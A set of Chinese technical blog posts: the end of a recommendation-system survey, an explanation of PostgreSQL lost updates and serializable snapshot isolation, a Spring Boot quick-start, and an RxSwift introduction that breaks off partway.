商品个性化推荐算法主要包含Match和Rank两个阶段：Match阶段也称为商品召回阶段，在推荐系统中用户对商品的行为称为用户Trigger，通过长期收集用户作用在商品上的行为，建立用户行为和商品的矩阵称为X2I，最后通过用户的Trigger和关系矩阵X2I进行商品召回。Rank阶段利用不同指标的目标函数对商品进行打分，根据推荐系统的规则对商品的多个维度进行综合排序。下面以闲鱼的首页feeds为例，简单介绍闲鱼的个性化推荐流程。
所示步骤1.1，利用用户的信息获取用户Trigger，用户信息包括用户的唯一标识userId，用户的设备信息唯一标识uttid。
所示步骤1.2，返回用户Trigger其中包括用户的点击、购买过的商品、喜欢的类目、用户的标签、常逛的店铺、购物车中的商品、喜欢的品牌等。
所示步骤1.3，进行商品召回，利用Trigger和X2I矩阵进行join完成对商品的召回。
所示步骤1.4，返回召回的商品列表，在商品召回中一般以I2I关系矩阵召回的商品为主，其他X2I关系矩阵召回为辅助。
步骤2.1，进行商品过滤，对召回商品进行去重，过滤购买过的商品，剔除过度曝光的商品。
所示步骤2.2，进行商品打分，打分阶段利用itemInfo和不同算法指标对商品多个维度打分。
步骤2.3，进行商品排序，根据规则对商品多个维度的分数进行综合排序。
步骤2.4，进行返回列表截断，截断TopN商品返回给用户。
闲鱼通过以上Match和Rank两个阶段八个步骤完成商品的推荐，同时从图中可以看出为了支持商品的个性化推荐，需要对X2I、itemInfo、userTrigger数据回流到搜索引擎，这些数据包含天级别回流数据和小时级别回流数据。

小商品的特点

小商品池存在以下几个特点。
实时性：在闲鱼搭建的小商品池中要求商品可以实时的流入到该规则下的商品池，为用户提供最新的优质商品。
周期性：在小商品池中，很多商品拥有周期属性，例如免费送的拍卖场景，拍卖周期为6小时，超过6小时后将被下架。
目前频道导购页面大多还是利用搜索引擎把商品呈现给用户，为了保证商品的曝光，一般利用搜索的时间窗口在商品池中对商品进一步筛选，但是仍存在商品曝光的问题，如果时间窗口过大，那么将会造成商品过度曝光，如果商品窗口过小那么就会造成商品曝光不足，同时还存在一个搜索无法解决的问题，同一时刻每个用户看到的商品都是相同的，无法针对用户进行个性化推荐，为了进一步提升对用户的服务，小商品池亟需引入个性化推荐。

推荐在小商品池的解决方案

在上文中利用全站X2I数据对小商品池的商品进行推荐过程中，发现在Match阶段，当小商品池过小时会造成商品召回不足的问题，为了提升小商品池推荐过程中有效召回数量，提出了如下三种解决方案。
提前过滤法：数据回流到搜索引擎前，小商品池对数据进行过滤，产生小商品池的回流数据，在商品进行召回阶段，利用小商品池的X2I进行商品召回，以此提升商品的召回率。

商品向量化法： 在Match阶段利用向量相似性进行商品召回，商品向量化是利用向量搜索的能力，把商品的特性和规则通过函数映射成商品向量，同时把用户的Trigger和规则映射成用户向量，文本转换向量常用词袋模型和机器学习方法，词袋模型在文本长度较短时可以很好的把文本用词向量标识，但是文本长度过长时受限于词袋大小，如果词袋过小效果将会很差，机器学习的方法是利用Word2Vector把文本训练成向量，根据经验值向量维度一般为200维时效果较好。然后利用向量搜索引擎，根据用户向量搜索出相似商品向量，以此作为召回的商品。如图5所示商品的向量分两部分，前20位代表该商品的规则，后200位代表商品的基本特征信息。

商品搜索引擎法： 在Match阶段利用商品搜索引擎对商品进行召回，如图6所示在商品进入搜索引擎时，对商品结构进行理解，在商品引擎中加入Tag和规则，然后根据用户的Trigger和规则作为搜索条件，利用搜索引擎完成商品的召回。搜索引擎的天然实时性解决了小商品池推荐强实时性的问题。

3.3 饿了么推荐系统：从0到1
对于任何一个外部请求, 系统都会构建一个QueryInfo(查询请求), 同时从各种数据源提取UserInfo(用户信息)、ShopInfo(商户信息)、FoodInfo(食物信息)以及ABTest配置信息等, 然后调用Ranker排序。以下是排序的基本流程(如下图所示)：
#调取RankerManager, 初始化排序器Ranker：

根据ABTest配置信息, 构建排序器Ranker；

调取ScorerManger, 指定所需打分器Scorer(可以多个); 同时, Scorer会从ModelManager获取对应Model, 并校验；

调取FeatureManager, 指定及校验Scorer所需特征Features。

#调取InstanceBuilder, 汇总所有打分器Scorer的特征, 计算对应排序项EntityInfo(餐厅/食物)排序所需特征Features；
#对EntityInfo进行打分, 并按需对Records进行排序。

这里需要说明的是：任何一个模型Model都必须以打分器Scorer形式展示或者被调用。主要是基于以下几点考虑：

模型迭代：比如同一个Model，根据时间、地点、数据抽样等衍生出多个版本Version；

模型参数：比如组合模式(见下一小节)时的权重与轮次设定，模型是否支持并行化等；

特征参数：特征Feature计算参数，比如距离在不同城市具有不同的分段参数。

3.4 爱奇艺个性化推荐排序实践
我们的推荐系统主要分为两个阶段，召回阶段和排序阶段。
召回阶段根据用户的兴趣和历史行为，同千万级的视频库中挑选出一个小的候选集（几百到几千个视频）。这些候选都是用户感兴趣的内容，排序阶段在此基础上进行更精准的计算，能够给每一个视频进行精确打分，进而从成千上万的候选中选出用户最感兴趣的少量高质量内容（十几个视频）。

推荐系统的整体结构如图所示，各个模块的作用如下：
用户画像：包含用户的人群属性、历史行为、兴趣内容和偏好倾向等多维度的分析，是个性化的基石
特征工程：包含了了视频的类别属性，内容分析，人群偏好和统计特征等全方位的描绘和度量，是视频内容和质量分析的基础
召回算法：包含了多个通道的召回模型，比如协同过滤，主题模型，内容召回和SNS等通道，能够从视频库中选出多样性的偏好内容
排序模型：对多个召回通道的内容进行同一个打分排序，选出最优的少量结果。
除了这些之外推荐系统还兼顾了推荐结果的多样性，新鲜度，逼格和惊喜度等多个维度，更能够满足用户多样性的需求。
然后，介绍了推荐排序系统架构、推荐机器学习排序算法演进。
3.5 携程个性化推荐算法实践
推荐流程大体上可以分为3个部分，召回、排序、推荐结果生成，整体的架构如下图所示。

召回阶段，主要是利用数据工程和算法的方式，从千万级的产品中锁定特定的候选集合，完成对产品的初步筛选，其在一定程度上决定了排序阶段的效率和推荐结果的优劣。
业内比较传统的算法，主要是CF[1][2]、基于统计的Contextual推荐和LBS，但近期来深度学习被广泛引入，算法性取得较大的提升，如：2015年Netflix和Gravity R&D Inc提出的利用RNN的Session-based推荐[5]，2016年Recsys上提出的结合CNN和PMF应用于Context-aware推荐[10]，2016年Google提出的将DNN作为MF的推广，可以很容易地将任意连续和分类特征添加到模型中[9]，2017年IJCAI会议中提出的利用LSTM进行序列推荐[6]。2017年携程个性化团队在AAAI会议上提出的深度模型aSDAE，通过将附加的side information集成到输入中，可以改善数据稀疏和冷启动问题[4]。
对于召回阶段得到的候选集，会对其进行更加复杂和精确的打分与重排序，进而得到一个更小的用户可能感兴趣的产品列表。携程的推荐排序并不单纯追求点击率或者转化率，还需要考虑距离控制，产品质量控制等因素。相比适用于搜索排序，文本相关性检索等领域的pairwise和listwise方法，pointwise方法可以通过叠加其他控制项进行干预，适用于多目标优化问题。
工业界的推荐方法经历从线性模型＋大量人工特征工程[11] -> 复杂非线性模型-> 深度学习的发展。Microsoft首先于2007年提出采用Logistic Regression来预估搜索广告的点击率[12]，并于同年提出OWLQN优化算法用于求解带L1正则的LR问题[13]，之后于2010年提出基于L2正则的在线学习版本Ad Predictor[14]。
Google在2013年提出基于L1正则化的LR优化算法FTRL-Proximal[15]。2010年提出的Factorization Machine算法[17]和进一步2014年提出的Filed-aware Factorization Machine[18]旨在解决稀疏数据下的特征组合问题，从而避免采用LR时需要的大量人工特征组合工作。
阿里于2011年提出Mixture of Logistic Regression直接在原始空间学习特征之间的非线性关系[19]。Facebook于2014年提出采用GBDT做自动特征组合，同时融合Logistic Regression[20]。
近年来，深度学习也被成功应用于推荐排序领域。Google在2016年提出wide and deep learning方法[21]，综合模型的记忆和泛化能力。进一步华为提出DeepFM[15]模型用于替换wdl中的人工特征组合部分。阿里在2017年将attention机制引入，提出Deep Interest Network[23]。
携程在实践相应的模型中积累了一定的经验，无论是最常用的逻辑回归模型（Logistic Regression），树模型（GBDT，Random Forest）[16]，因子分解机（FactorizationMachine），以及近期提出的wdl模型。同时，我们认为即使在深度学习大行其道的今下，精细化的特征工程仍然是不可或缺的。
基于排序后的列表，在综合考虑多样性、新颖性、Exploit & Explore等因素后，生成最终的推荐结果。
四、总结
之前没有接触过推荐系统，现在由于工作需要开始接触这块内容。很多概念和技术不懂，需要补很多东西。近期也去参加了内部推荐大赛真实地操作了一轮，同时开始学习推荐系统的基础知识，相关架构等，为下一步工作打下必要的基础。
推荐系统是能在几乎所有产品中存在的载体，它几乎可以无延时地以用户需求为导向，来满足用户。其代表的意义和效率，远远超过传统模式。毋庸置疑，牛逼的推荐系统就是未来。但这里有个难点就在于，推荐系统是否做得足够的好。而从目前来看，推荐算法和推荐系统并没有达到人们的预期。因为人的需求是极难猜测的。
又想到之前知乎看到一篇文章，说的是国内很多互联网公司都有的运营岗位，在国外是没有专设这个岗位的。还记得作者分析的较突出原因就是：外国人比较规矩，生活和饮食较单调，例如高兴了都点披萨。而中国不一样，从千千万万的菜品就能管中窥豹，国人的爱好极其广泛，众口难调。加上国外人工时很贵，那么利用算法去拟合用户的爱好和需求，自动地去挖掘用户需求，进行下一步的深耕和推荐就是一个替代方案。这也是国外很推崇推荐系统的侧面原因。而在中国，人相对来说是便宜的，加上国人的口味更多更刁钻，算法表现不好，所以会设很多专门的运营岗位。但慢慢也开始意识到这将是一个趋势，加上最近ai大热，各家大厂都在这块不断深耕。
回到推荐系统上，从现实中客观的原因就可以看到，真正能拟合出用户的需求和爱好确实是很困难的事情。甚至有时候用户都不知道自己想要的是啥，作为中国人，没有主见和想法是正常的，太有主见是违背标准答案的。但推荐系统背后代表的意义是：你的产品知道用户的兴趣，能满足用户的兴趣，那么必定用户就会离不开你。用户离不开的产品，肯定会占领市场，肯定就有极高的估值和想象空间。这也就是大家都在做推荐系统，虽然用起来傻傻的，效果也差强人意，依然愿意大力投入的根本原因。
几句胡诌，前期学习过后的简单总结，自己还有很多东西和细节需要继续学习和研究。能力有限，文中不妥之处还请指正~
（ps：文中一些截图和文字的版权归属原作者，且均已标注引用资料来源地址，本文只是学习总结之用，如有侵权，联系我删除）

问答
推荐系统如何实现精准推荐？
相关阅读
推荐系统基础知识储备
量化评估推荐系统效果
基于用户画像的实时异步化视频推荐系统
【每日课程推荐】机器学习实战！快速入门在线广告业务及CTR相应知识

此文已由作者授权腾讯云+社区发布，更多原文请点击
搜索关注公众号「云加社区」，第一时间获取技术干货，关注后回复1024 送你一份技术课程大礼包！
海量技术实践经验，尽在云加社区！

********************************************************************************************************************************************************************************************************
浅析Postgres中的并发控制(Concurrency Control)与事务特性(下)
上文我们讨论了PostgreSQL的MVCC相关的基础知识以及实现机制。关于PostgreSQL中的MVCC，我们只讲了元组可见性的问题，还剩下两个问题没讲。一个是"Lost Update"问题，另一个是PostgreSQL中的序列化快照隔离机制(SSI，Serializable Snapshot Isolation)。今天我们就来继续讨论。

3.2 Lost Update
所谓"Lost Update"就是写写冲突。当两个并发事务同时更新同一条数据时发生。"Lost Update"必须在REPEATABLE READ 和 SERIALIZABLE 隔离级别上被避免，即拒绝并发地更新同一条数据。下面我们看看在PostgreSQL上如何处理"Lost Update"
有关PostgreSQL的UPDATE操作，我们可以看看ExecUpdate()这个函数。然而今天我们不讲具体的函数，我们形而上一点。只从理论出发。我们只讨论下UPDATE执行时的情形，这意味着，我们不讨论什么触发器啊，查询重写这些杂七杂八的，只看最"干净"的UPDATE操作。而且，我们讨论的是两个并发事务的UPDATE操作。
请看下图，下图显示了两个并发事务中UPDATE同一个tuple时的处理。


[1]目标tuple处于正在更新的状态

我们看到Tx_A和Tx_B在并发执行，Tx_A先更新了tuple，这时Tx_B准备去更新tuple，发现Tx_A更新了tuple，但是还没有提交。于是，Tx_B处于等待状态，等待Tx_A结束(commit或者abort)。
当Tx_A提交时，Tx_B解除等待状态，准备更新tuple，这时分两个情况：如果Tx_B的隔离级别是READ COMMITTED，那么OK，Tx_B进行UPDATE(可以看出，此时发生了Lost Update)。如果Tx_B的隔离级别是REPEATABLE READ或者是SERIALIZABLE，那么Tx_B会立即被abort，放弃更新。从而避免了Lost Update的发生。
当Tx_A和Tx_B的隔离级别都为READ COMMITTED时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED;START TRANSACTIONpostgres=# update test set b = b+1;↓↓this transaction is being blocked↓UPDATE 1



当Tx_A的隔离级别为READ COMMITTED，Tx_B的隔离级别为REPEATABLE READ时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL REPEATABLE READ;START TRANSACTIONpostgres=# update test set b = b+1;↓↓this transaction is being blocked↓ERROR:couldn't serialize access due to concurrent update




[2]目标tuple已经被并发的事务更新

我们看到Tx_A和Tx_B在并发执行，Tx_A先更新了tuple并且已经commit，Tx_B再去更新tuple时发现它已经被更新过了并且已经提交。如果Tx_B的隔离级别是READ COMMITTED，根据我们前面说的，，Tx_B在执行UPDATE前会重新获取snapshot，发现Tx_A的这次更新对于Tx_B是可见的，因此Tx_B继续更新Tx_A更新过得元组(Lost Update)。而如果Tx_B的隔离级别是REPEATABLE READ或者是SERIALIZABLE，那么显然我们会终止当前事务来避免Lost Update。
当Tx_A的隔离级别为READ COMMITTED，Tx_B的隔离级别为REPEATABLE READ时的例子：



Tx_A
Tx_B




postgres=# START TRANSACTION ISOLATION LEVEL READ COMMITTED ;START TRANSACTIONpostgres=# update test set b = b+1 where a =1;UPDATE 1postgres=# commit;COMMIT
postgres=# START TRANSACTION ISOLATION LEVEL REPEATABLE READ;START TRANSACTIONpostgres=# select * from test ; a b---+--- 1 5(1 row)postgres=# update test set b = b+1ERROR: could not serialize access due to concurrent update




[3]更新无冲突

这个很显然，没有冲突就没有伤害。Tx_A和Tx_B照常更新，不会有Lost Update。
从上面我们也可以看出，在使用SI(Snapshot Isolation)机制时，两个并发事务同时更新一条记录时，先更新的那一方获得更新的优先权。但是在下面提到的SSI机制中会有所不同，先提交的事务获得更新的优先权。

3.3 SSI(Serializable Snapshot Isolation)
SSI，可序列化快照隔离，是PostgreSQL在9.1之后，为了实现真正的SERIALIZABLE(可序列化)隔离级别而引入的。
对于SERIALIZABLE隔离级别，官方介绍如下：
可序列化隔离级别提供了最严格的事务隔离。这个级别为所有已提交事务模拟序列事务执行；就好像事务被按照序列一个接着另一个被执行，而不是并行地被执行。但是，和可重复读级别相似，使用这个级别的应用必须准备好因为序列化失败而重试事务。事实上，这个隔离级别完全像可重复读一样地工作，除了它会监视一些条件，这些条件可能导致一个可序列化事务的并发集合的执行产生的行为与这些事务所有可能的序列化（一次一个）执行不一致。这种监控不会引入超出可重复读之外的阻塞，但是监控会产生一些负荷，并且对那些可能导致序列化异常的条件的检测将触发一次序列化失败。
讲的比较繁琐，我的理解是：
1.只针对隔离级别为SERIALIZABLE的事务；
2.并发的SERIALIZABLE事务与按某一个顺序单独的一个一个执行的结果相同。
条件1很好理解，系统只判断并发的SERIALIZABLE的事务之间的冲突；
条件2我的理解就是并发的SERIALIZABLE的事务不能同时修改和读取同一个数据，否则由并发执行和先后按序列执行就会不一致。
但是这个不能同时修改和读取同一个数据要限制在多大的粒度呢？
我们分情况讨论下。

[1] 读写同一条数据

似乎没啥问题嘛，根据前面的论述，这里的一致性在REPEATABLE READ阶段就保证了，不会有问题。
以此类推，我们同时读写2,3,4....n条数据，没问题。

[2]读写闭环

啥是读写闭环？这我我造的概念，类似于操作系统中的死锁，即事务Tx_A读tuple1，更新tuple2，而Tx_B恰恰相反，读tuple2， 更新tuple1.
我们假设事务开始前的tuple1，tuple2为tuple1_1，tuple2_1,Tx_A和Tx_B更新后的tuple1，tuple2为tuple1_2，tuple2_2。
这样在并发下：
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_1。
同理，Tx_B读到的tuple1是tuple1_1，tuple2是tuple2_1。
而如果我们以Tx_A，Tx_B的顺序串行执行时，结果为：
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_1。
Tx_B读到的tuple1是tuple1_2(被Tx_A更新了)，tuple2是tuple2_1。
反之，而如果我们以Tx_B，Tx_A的顺序串行执行时，结果为：
Tx_B读到的tuple1是tuple1_1，tuple2是tuple2_1。
Tx_A读到的tuple1是tuple1_1，tuple2是tuple2_2(被Tx_B更新了)。

可以看出，这三个结果都不一样，不满足条件2，即并发的Tx_A和Tx_B不能被模拟为Tx_A和Tx_B的任意一个序列执行，导致序列化失败。
其实我上面提到的读写闭环，更正式的说法是：序列化异常。上面说的那么多，其实下面两张图即可解释。

关于这个*-conflicts我们遇到好几个了。我们先总结下：
wr-conflicts (Dirty Reads)
ww-conflicts (Lost Updates)
rw-conflicts (serialization anomaly)
下面说的SSI机制，就是用来解决rw-conflicts的。
好的，下面就开始说怎么检测这个序列化异常问题，也就是说，我们要开始了解下SSI机制了。
在PostgreSQL中，使用以下方法来实现SSI：

利用SIREAD LOCK(谓词锁)记录每一个事务访问的对象(tuple、page和relation)；
在事务写堆表或者索引元组时利用SIREAD LOCK监测是否存在冲突；
如果发现到冲突(即序列化异常)，abort该事务。

从上面可以看出，SIREAD LOCK是一个很重要的概念。解释了这个SIREAD LOCK，我们也就基本上理解了SSI。
所谓的SIREAD LOCK，在PostgreSQL内部被称为谓词锁。他的形式如下：
SIREAD LOCK := { tuple|page|relation, {txid [, ...]} }
也就是说，一个谓词锁分为两个部分：前一部分记录被"锁定"的对象(tuple、page和relation)，后一部分记录同时访问了该对象的事务的virtual txid(有关它和txid的区别，这里就不做多介绍了)。
SIREAD LOCK的实现在函数CheckForSerializableConflictOut中。该函数在隔离级别为SERIALIZABLE的事务中发生作用，记录该事务中所有DML语句所造成的影响。
例如，如果txid为100的事务读取了tuple_1，则创建一个SIREAD LOCK为{tuple_1, {100}}。此时，如果另一个txid为101的事务也读取了tuple_1，则该SIREAD LOCK升级为{tuple_1, {100，101}}。需要注意的是如果在DML语句中访问了索引，那么索引中的元组也会被检测，创建对应的SIREAD LOCK。
SIREAD LOCK的粒度分为三级：tuple|page|relation。如果同一个page中的所有tuple都被创建了SIREAD LOCK，那么直接创建page级别的SIREAD LOCK，同时释放该page下的所有tuple级别的SIREAD LOCK。同理，如果一个relation的所有page都被创建了SIREAD LOCK，那么直接创建relation级别的SIREAD LOCK，同时释放该relation下的所有page级别的SIREAD LOCK。
当我们执行SQL语句使用的是sequential scan时，会直接创建一个relation 级别的SIREAD LOCK，而使用的是index scan时，只会对heap tuple和index page创建SIREAD LOCK。
同时，我还是要说明的是，对于index的处理时，SIREAD LOCK的最小粒度是page，也就是说你即使只访问了index中的一个index tuple，该index tuple所在的整个page都被加上了SIREAD LOCK。这个特性常常会导致意想不到的序列化异常，我们可以在后面的例子中看到。
有了SIREAD LOCK的概念，我们现在使用它来检测rw-conflicts。
所谓rw-conflicts，简单地说，就是有一个SIREAD LOCK，还有分别read和write这个SIREAD LOCK中的对象的两个并发的Serializable事务。
这个时候，另外一个函数闪亮登场：CheckForSerializableConflictIn()。每当隔离级别为Serializable事务中执行INSERT/UPDATE/DELETE语句时，则调用该函数判断是否存在rw-conflicts。
例如，当txid为100的事务读取了tuple_1，创建了SIREAD LOCK ： {tuple_1, {100}}。此时，txid为101的事务更新tuple_1。此时调用CheckForSerializableConflictIn()发现存在这样一个状态： {r=100, w=101, {Tuple_1}}。显然，检测出这是一个rw-conflicts。
下面是举例时间。
首先，我们有这样一个表：
testdb=# CREATE TABLE tbl (id INT primary key, flag bool DEFAULT false);
testdb=# INSERT INTO tbl (id) SELECT generate_series(1,2000);
testdb=# ANALYZE tbl;
并发执行的Serializable事务像下面那样执行：

假设所有的SQL语句都走的index scan。这样，当SQL语句执行时，不仅要读取对应的heap tuple，还要读取heap tuple 对应的index tuple。如下图：

执行状态如下：
T1: Tx_A执行SELECT语句，该语句读取了heap tuple(Tuple_2000)和index page(Pkey2);
T2: Tx_B执行SELECT语句，该语句读取了heap tuple(Tuple_1)和index page(Pkey1);
T3: Tx_A执行UPDATE语句，该语句更新了Tuple_1;
T4: Tx_B执行UPDATE语句，该语句更新了Tuple_2000;
T5: Tx_A commit;
T6: Tx_B commit; 由于序列化异常，commit失败，状态为abort。
这时我们来看一下SIREAD LOCK的情况。

T1: Tx_A执行SELECT语句，调用CheckForSerializableConflictOut()创建了SIREAD LOCK：L1={Pkey_2,{Tx_A}} 和 L2={Tuple_2000,{Tx_A}};
T2: Tx_B执行SELECT语句，调用CheckForSerializableConflictOut创建了SIREAD LOCK：L3={Pkey_1,{Tx_B}} 和 L4={Tuple_1,{Tx_B}};
T3: Tx_A执行UPDATE语句，调用CheckForSerializableConflictIn()，发现并创建了rw-conflict ：C1={r=Tx_B, w=Tx_A,{Pkey_1,Tuple_1}}。这很显然，因为Tx_B和TX_A分别read和write这两个object。
T4: Tx_A执行UPDATE语句，调用CheckForSerializableConflictIn()，发现并创建了rw-conflict ：C1={r=Tx_A, w=Tx_B,{Pkey_2,Tuple_2000}}。到这里，我们发现C1和C2构成了precedence graph中的一个环。因此，Tx_A和Tx_B这两个事务都进入了non-serializable状态。但是由于Tx_A和Tx_B都未commit,因此CheckForSerializableConflictIn()并不会abort Tx_B(为什么不abort Tx_A？因此PostgreSQL的SSI机制中采用的是first-committer-win，即发生冲突后，先提交的事务保留，后提交的事务abort。)
T5: Tx_A commit;调用PreCommit_CheckForSerializationFailure()函数。该函数也会检测是否存在序列化异常。显然此时Tx_A和Tx_B处于序列化冲突之中，而由于发现Tx_B仍然在执行中，所以，允许Tx_A commit。
T6: Tx_B commit; 由于序列化异常，且和Tx_B存在序列化冲突的Tx_A已经被提交。因此commit失败，状态为abort。
更多更复杂的例子，可以参考这里.
前面在讨论SIREAD LOCK时，我们谈到对于index的处理时，SIREAD LOCK的最小粒度是page。这个特性会导致意想不到的序列化异常。更专业的说法是"False-Positive Serialization Anomalies"。简而言之实际上并没有发生序列化异常，但是我们的SSI机制不完善，产生了误报。
下面我们来举例说明。

对于上图，如果SQL语句走的是sequential scan，情形如下：

如果是index scan呢？还是有可能出现误报：


这篇就是这样。依然还是有很多问题没有讲清楚。留待下次再说吧(拖延症晚期)。

********************************************************************************************************************************************************************************************************
构建微服务：快速搭建Spring Boot项目
Spring Boot简介：
       Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者（官网介绍）。
 
Spring Boot特点：
       1. 创建独立的Spring应用程序
       2. 嵌入的Tomcat，无需部署WAR文件
       3. 简化Maven配置
       4. 自动配置Spring
       5. 提供生产就绪型功能，如指标，健康检查和外部配置
       6. 绝对没有代码生成并且对XML也没有配置要求
 
 
快速入门：
       1、访问http://start.spring.io/
       2、填写相关的项目信息、jdk版本等（可参考下图）
    
       3、点击Generate Project，就会生成一个maven项目的压缩包，下载项目压缩包
       4、解压后，使用eclipse，Import -> Existing Maven Projects -> Next ->选择解压后的文件夹-> Finsh
 
项目结构介绍：
       如下图所示，Spring Boot的基础结构共三个文件：
       
       src/main/java  --程序开发以及主程序入口
       src/main/resources --配置文件
       src/test/java  --测试程序
 
 
Spring Boot推荐的项目结构：
       根目录：com.example.myproject  
       1）domain：实体类（com.example.domain）
       2）Dao：数据访问层（com.example.repository）
       3）Service：数据服务接口层（com.example.service）
            ServiceImpl：数据服务实现层（com.example.service.impl）
       4）Controller：前端控制器（com.example.controller）
       5）utils：工具类（com.example.utils）
       6）constant：常量接口类（com.example.constant）
       7）config：配置信息类（com.example.config）
       8）dto：数据传输对象（Data Transfer Object，用于封装多个实体类（domain）之间的关系，不破坏原有的实体类结构）（com.example.dto）
       9）vo：视图包装对象（View Object，用于封装客户端请求的数据，防止部分数据泄露，保证数据安全，不破坏原有的实体类结构）（com.example.vo）
 
 
引入Web模块：
       在pom.xml添加支持Web的模块

1 <dependency>
2     <groupId>org.springframework.boot</groupId>
3     <artifactId>spring-boot-starter-web</artifactId>
4 </dependency>

 
运行项目：
       1、创建controller  

 1 package com.example.annewebsite_server.controller;
 2 
 3 import org.springframework.web.bind.annotation.GetMapping;
 4 import org.springframework.web.bind.annotation.RestController;
 5 
 6 @RestController
 7 public class HelloController {
 8     @GetMapping("/hello")
 9     public String say(){
10         return "Hello Spring Boot!";
11     }
12 }

        
       
       2、启动项目入口
       
 
 
       3、项目启动成功
       
 
       4、在浏览器中进行访问（http://localhost:8080/hello）
       
       以上是一个Spring Boot项目的搭建过程，希望能够给正在学习Spring Boot的同仁带来一些些帮助，不足之处，欢迎指正。
 

********************************************************************************************************************************************************************************************************
RxSwift 入门
ReactiveX 是一个库，用于通过使用可观察序列来编写异步的、基于事件的程序。
它扩展了观察者模式以支持数据、事件序列，并添加了允许你以声明方式组合序列的操作符，同时抽象对低层线程、同步、线程安全等。
本文主要作为 RxSwift 的入门文章，对 RxSwift 中的一些基础内容、常用实践，做些介绍。
本文地址为：https://www.cnblogs.com/xjshi/p/9755095.html，转载请注明出处。
Observables aka Sequences
Basics
观察者模式（这里指Observable(Element> Sequence)和正常序列（Sequence)的等价性对于理解 Rx 是相当重要的。
每个 Observable 序列只是一个序列。Observable 与 Swift 的 Sequence 相比，其主要优点是可以异步接收元素。这是 RxSwift 的核心。

Observable(ObservableType) 与 Sequence 等价
Observable.subscribe 方法与 Sequence.makeIterator方法等价
Observer（callback）需要被传递到 Observable.subscribe 方法来接受序列元素，而不是在返回的 iterator 上调用 next() 方法

Sequence 是一个简单、熟悉的概念，很容易可视化。
人是具有巨大视觉皮层的生物。当我们可以轻松地想想一个概念时，理解它就容易多了。
我们可以通过尝试模拟每个Rx操作符内的事件状态机到序列上的高级别操作来接触认知负担。
如果我们不使用 Rx 而是使用模型异步系统（model asynchronous systems），这可能意味着我们的代码会充满状态机和瞬态，这些正式我们需要模拟的，而不是抽象。
List 和 Sequence 可能是数学家和程序员首先学习的概念之一。
这是一个数字的序列：
--1--2--3--4--5--6--|   // 正常结束
另一个字符序列：
--a--b--a--a--a---d---X     // terminates with error
一些序列是有限的，而一些序列是无限的，比如一个按钮点击的列：
---tap-tap-------tap--->
这些被叫做 marble diagram。可以在rxmarbles.com了解更多的 marble diagram。
如果我们将序列愈发指定为正则表达式，它将如下所示：
next*(error | completed)?
这描述了以下内容：

Sequence 可以有 0 个 或者多个元素
一旦收到 error 或 completed 事件，这个 Sequence 就不能再产生其他元素

在 Rx 中， Sequence 被描述为一个 push interface（也叫做 callbak）。
enum Event<Element>  {
    case next(Element)      // next element of a sequence
    case error(Swift.Error) // sequence failed with error
    case completed          // sequence terminated successfully
}

class Observable<Element> {
    func subscribe(_ observer: Observer<Element>) -> Disposable
}

protocol ObserverType {
    func on(_ event: Event<Element>)
}
当序列发送 error 或 completed 事件时，将释放计算序列元素的所有内部资源。
要立即取消序列元素的生成，并释放资源，可以在返回的订阅（subscription）上调用 dispose。
如果一个序列在有限时间内结束，则不调用 dispose 或者不使用 disposed(by: disposeBag) 不会造成任何永久性资源泄漏。但是，这些资源会一直被使用，直到序列完成（完成产生元素，或者返回一个错误）。
如果一个序列没有自行终止，比如一系列的按钮点击，资源会被永久分配，直到 dispose 被手动调用（在 disposeBag 内调用，使用 takeUntil 操作符，或者其他方式）。
使用 dispose bag 或者 takeUtil 操作符是一个确保资源被清除的鲁棒（robust）的方式。即使序列将在有限时间内终止，我们也推荐在生产环境中使用它们。
Disposing
被观察的序列（observed sequence）有另一种终止的方式。当我们使用完一个序列并且想要释放分配用于计算即将到来的元素的所有资源时，我们可以在一个订阅上调用 dispose。
这时一个使用 interval 操作符的例子：
let scheduler = SerialDispatchQueueScheduler(qos: .default)
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
    .subscribe { event in
        print(event)
    }

Thread.sleep(forTimeInterval: 2.0)

subscription.dispose()
上边的例子打印：
0
1
2
3
4
5
注意，你通常不希望调用 dispose，这只是一个例子。手动调用 dispose 通常是一种糟糕的代码味道。dispose 订阅有更好的方式，比如 DisposeBag、takeUntil操作符、或者一些其他的机制。
那么，上边的代码是否可以在 dispose 被执行后，打印任何东西？答案是，是情况而定。

如果上边的 scheduler 是串行调度器（serial scheduler），比如 MainScheduler ，dispose 在相同的串行调度器上调用，那么答案就是 no。
否则，答案是 yes。

你仅仅有两个过程在并行执行。

一个在产生元素
另一个 dispose 订阅

“可以在之后打印某些内容吗？”这个问题，在这两个过程在不同调度上执行的情况下甚至没有意义。
如果我们的代码是这样的：
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
            .observeOn(MainScheduler.instance)
            .subscribe { event in
                print(event)
            }

// ....

subscription.dispose() // called from main thread
在 dispose 调用返回后，不会打印任何东西。
同样，在这个例子中：
let subscription = Observable<Int>.interval(0.3, scheduler: scheduler)
            .observeOn(serialScheduler)
            .subscribe { event in
                print(event)
            }

// ...

subscription.dispose() // executing on same `serialScheduler`
在 dispose 调用返回后，也不会打印任何东西。
Dispose Bag

Dispose bags are used to return ARC like behavior to RX.

当一个 DisposeBag 被释放时，它会在每一个可被 dispose 的对象（disposables）上调用 dispose。
它没有 dispose 方法，因此不允许故意显式地调用 dispose。如果需要立即清理，我们可以创建一个新的 DisposeBag。
self.disposeBag = DisposeBag()
这将清除旧的引用，并引起资源清理。
如果仍然需要手动清理，可以使用 CompositeDisposable。它具有所需的行为，但一旦调用了 dispose 方法，它将立即处理任何新添加可被dispose的对象（disposable）。
Take until
另一种在 dealloc 时自动处理（dispose）订阅的方式是使用 takeUtil 操作符。
sequence
    .takeUntil(self.rx.deallocated)
    .subscribe {
        print($0)
    }

Implicit Observable guarantees
